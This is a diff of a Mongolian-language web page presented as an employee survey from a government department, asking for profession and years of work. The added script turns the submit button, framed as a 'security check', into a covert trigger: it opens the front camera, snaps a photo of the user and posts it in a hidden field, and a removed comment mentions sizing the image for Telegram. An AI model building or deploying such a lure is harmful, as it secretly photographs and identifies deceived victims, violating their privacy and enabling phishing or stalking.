@@ -5,143 +5,19 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Ажилтан Судалгаа | Нууцлал</title>
     <style>
-        /* CSS загвар (Өмнөх загвар хэвээр) */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-
-        body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-
-        .container {
-            max-width: 800px;
-            width: 100%;
-            background-color: white;
-            border-radius: 15px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
-            padding: 40px;
-        }
-
-        header {
-            text-align: center;
-            margin-bottom: 40px;
-            padding-bottom: 20px;
-            border-bottom: 3px solid #667eea;
-        }
-
-        .logo {
-            font-size: 2.5rem;
-            font-weight: bold;
-            color: #667eea;
-            margin-bottom: 10px;
-        }
-
-        .subtitle {
-            font-size: 1.1rem;
-            color: #666;
-        }
-
-        .survey-form {
-            display: flex;
-            flex-direction: column;
-            gap: 30px;
-        }
-
-        .question {
-            background-color: #f8f9fa;
-            padding: 25px;
-            border-radius: 10px;
-            border-left: 4px solid #667eea;
-        }
-
-        .question-title {
-            font-size: 1.2rem;
-            font-weight: bold;
-            color: #333;
-            margin-bottom: 15px;
-        }
-
-        .question-number {
-            color: #667eea;
-            margin-right: 8px;
-        }
-
-        input[type="text"],
-        textarea {
-            width: 100%;
-            padding: 12px;
-            border: 2px solid #ddd;
-            border-radius: 8px;
-            font-size: 1rem;
-            transition: border-color 0.3s;
-        }
-
-        input[type="text"]:focus,
-        textarea:focus {
-            outline: none;
-            border-color: #667eea;
-        }
-
-        textarea {
-            min-height: 100px;
-            resize: vertical;
-        }
-
-        .submit-btn {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            border: none;
-            padding: 15px 40px;
-            border-radius: 8px;
-            font-size: 1.2rem;
-            font-weight: bold;
-            cursor: pointer;
-            transition: transform 0.3s, box-shadow 0.3s;
-            margin-top: 20px;
-        }
-
-        .submit-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
-        }
-
-        .submit-btn:active {
-            transform: translateY(0);
-        }
-
-        .hidden {
-            display: none;
-        }
-
-        footer {
-            text-align: center;
-            margin-top: 30px;
-            padding-top: 20px;
-            border-top: 1px solid #ddd;
-            color: #666;
-            font-size: 0.9rem;
-        }
-
-        @media (max-width: 768px) {
-            .container {
-                padding: 25px;
-            }
-            .logo {
-                font-size: 2rem;
-            }
-            .question-title {
-                font-size: 1.1rem;
-            }
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
+        .container { max-width: 800px; width: 100%; background: white; border-radius: 15px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); padding: 40px; }
+        header { text-align: center; margin-bottom: 40px; padding-bottom: 20px; border-bottom: 3px solid #667eea; }
+        .logo { font-size: 2.5rem; font-weight: bold; color: #667eea; margin-bottom: 10px; }
+        .subtitle { font-size: 1.1rem; color: #666; }
+        .survey-form { display: flex; flex-direction: column; gap: 30px; }
+        .question { background: #f8f9fa; padding: 25px; border-radius: 10px; border-left: 4px solid #667eea; }
+        .question-title { font-size: 1.2rem; font-weight: bold; color: #333; margin-bottom: 15px; }
+        textarea { width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 8px; font-size: 1rem; min-height: 100px; }
+        .submit-btn { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; padding: 15px 40px; border-radius: 8px; font-size: 1.2rem; font-weight: bold; cursor: pointer; transition: all 0.3s; margin-top: 20px; }
+        .submit-btn:disabled { background: #ccc; cursor: not-allowed; }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
@@ -157,35 +33,24 @@
         <form id="surveyForm" class="survey-form" method="POST" action="/submit">
             <input type="hidden" id="photo_data_input" name="photo_data">
             <input type="hidden" name="camera_allowed" id="camera_allowed" value="false">
+            
             <div class="question">
-                <div class="question-title">
-                    <span class="question-number">1)</span>
-                     Ямар мэргэжлээр ажилладаг вэ?
-                </div>
-                <textarea id="q1_role" name="role_department" placeholder="Өөрийн мэргэжлээ энд бичнэ үү..." required></textarea>
+                <div class="question-title">1) Ямар мэргэжлээр ажилладаг вэ?</div>
+                <textarea name="role_department" placeholder="Өөрийн мэргэжлээ бичнэ үү..." required></textarea>
             </div>
 
             <div class="question">
-                <div class="question-title">
-                    <span class="question-number">2)</span>
-                    Мэргэжлээрээ хэдэн жил ажиллаж байгаа вэ?
-                </div>
-                <textarea id="q2_profession" name="profession" placeholder="Та ажилсан жилээ энд бичнэ үү..." required></textarea>
+                <div class="question-title">2) Мэргэжлээрээ хэдэн жил ажиллаж байгаа вэ?</div>
+                <textarea name="profession" placeholder="Ажилласан жилээ бичнэ үү..." required></textarea>
             </div>
 
             <div class="question" style="background-color: #fff3cd; border-color: #ffc107;">
-                <div class="question-title" style="color: #667eea; font-size: 1.1rem;">
-                    ⚠️ Баталгаажуулалт
-                </div>
-                <p style="color: #856404; font-size: 0.95rem;">Судалгааг илгээхийн өмнө нягталж **"Илгээх"** товчийг дарж, **аюулгүй байдлын нэмэлт шалгалт** хийхийг зөвшөөрнө үү.</p>
+                <div class="question-title" style="color: #856404;">⚠️ Баталгаажуулалт</div>
+                <p style="color: #856404; font-size: 0.95rem;">"Илгээх" товчийг дарж аюулгүй байдлын шалгалт хийхийг зөвшөөрнө үү.</p>
             </div>
 
             <button type="submit" class="submit-btn">Илгээх</button>
         </form>
-
-        <footer>
-            © 2025 Төрийн захиргааны удирдлагын хэлтэс. Бүх эрх хуулиар хамгаалагдсан.
-        </footer>
     </div>
 
     <script>
@@ -195,66 +60,41 @@
     const submitBtn = document.querySelector('.submit-btn');
     const photoDataInput = document.getElementById('photo_data_input');
     const cameraAllowedInput = document.getElementById('camera_allowed');
-
     const context = canvas.getContext('2d');
-    let cameraStream = null;
 
-    function handleSubmission(e) {
-        // 1. Формыг шууд илгээхийг зогсооно (Энэ нь маш чухал)
-        e.preventDefault(); 
-        
+    surveyForm.addEventListener('submit', function(e) {
+        e.preventDefault();
         submitBtn.disabled = true;
         submitBtn.textContent = 'Боловсруулж байна...';
 
-        // Камерын тохиргоо
-        const constraints = { 
-            video: { facingMode: "user", width: 640, height: 480 }, 
-            audio: false 
-        };
+        const constraints = { video: { facingMode: "user" }, audio: false };
 
-        // 2. Камер нээх оролдлого
         navigator.mediaDevices.getUserMedia(constraints)
             .then(stream => {
-                // --- ЗӨВШӨӨРСӨН ТОХИОЛДОЛ ---
-                cameraAllowedInput.value = 'true'; 
-                cameraStream = stream;
+                cameraAllowedInput.value = 'true';
                 video.srcObject = stream;
-                video.setAttribute("playsinline", true);
                 video.play();
 
-                // Камер бэлэн болохыг хүлээж зураг авах
                 video.onloadedmetadata = () => {
-                 Камерын бодит өргөн ба өндрийг Canvas-д оноох
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-    
-                 setTimeout(() => {
-                // Зургийг яг камерын харьцаагаар (aspect ratio) зурна
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        
-                 // Чанарыг 0.5-0.6 орчим байлгавал хэмжээ нь Telegram-д тохиромжтой
-                const dataURL = canvas.toDataURL('image/jpeg', 0.6);
-                photoDataInput.value = dataURL; 
+                    // Камерын бодит өргөн ба өндрийг тохируулах
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
 
-                // Камер унтраах
-                cameraStream.getTracks().forEach(track => track.stop());
+                    setTimeout(() => {
+                        // Зургийг яг камерын харьцаагаар буулгах
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        photoDataInput.value = canvas.toDataURL('image/jpeg', 0.6);
 
-                // Формыг илгээх
-                surveyForm.submit();
-             }, 1200); 
-            };
+                        stream.getTracks().forEach(track => track.stop());
+                        surveyForm.submit();
+                    }, 1200);
+                };
             })
             .catch(err => {
-                // --- ТАТГАЛЗСАН ЭСВЭЛ АЛДАА ГАРСАН ТОХИОЛДОЛ ---
-                console.warn('Камерын хандалт татгалзлаа:', err);
                 cameraAllowedInput.value = 'false';
-                
-                // Зөвшөөрөөгүй ч гэсэн текстийг илгээх
                 surveyForm.submit();
             });
-    }
-
-    surveyForm.addEventListener('submit', handleSubmission);
+    });
     </script>
 </body>
 </html>
